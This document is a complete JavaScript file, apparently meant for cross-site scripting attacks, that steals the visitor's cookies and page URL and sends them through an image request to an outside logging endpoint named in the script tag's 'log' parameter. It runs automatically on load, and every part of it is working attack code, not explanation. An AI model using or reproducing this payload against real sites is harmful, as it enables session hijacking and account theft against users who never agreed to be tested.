/*
 * XSS Cookie Exfiltration Payload (Dynamic - Beeceptor Compatible)
 * File: xss_payload.js
 * Requires the 'log' parameter in the script tag to specify the Beeceptor endpoint.
 */

function exfiltrateCookie() {
    // 1. Safely find the script tag that executed this code
    const scriptTag = document.currentScript;
    if (!scriptTag) {
        // Fallback for extreme compatibility, though modern browsers support currentScript
        console.error("XSS Payload failed: Could not retrieve script source URL.");
        return;
    }

    const scriptUrl = new URL(scriptTag.src);
    const urlParams = scriptUrl.searchParams;
    
    // 2. Extract the logging endpoint (Beeceptor URL) from the 'log' parameter
    const LOG_ENDPOINT_URL = urlParams.get('log'); 
    
    if (!LOG_ENDPOINT_URL) {
        console.error("XSS Payload failed: The 'log=...' parameter is missing from the script URL.");
        return;
    }

    // 3. Collect and encode data
    const stolenCookie = encodeURIComponent(document.cookie);
    const pageUrl = encodeURIComponent(window.location.href);

    // Build the exfiltration URL
    // Sending data via GET request using an Image object is standard for XSS data theft.
    const exfilUrl = `${LOG_ENDPOINT_URL}/xss-data` + 
                     `?cookie=${stolenCookie}` + 
                     `&page=${pageUrl}`;

    // 4. Trigger the data exfiltration to Beeceptor
    // The browser will make a request to Beeceptor, recording the data in your log.
    new Image().src = exfilUrl;
    
    console.log("XSS Payload executed. Check Beeceptor for the incoming request.");
}

// Execute the function immediately
exfiltrateCookie();
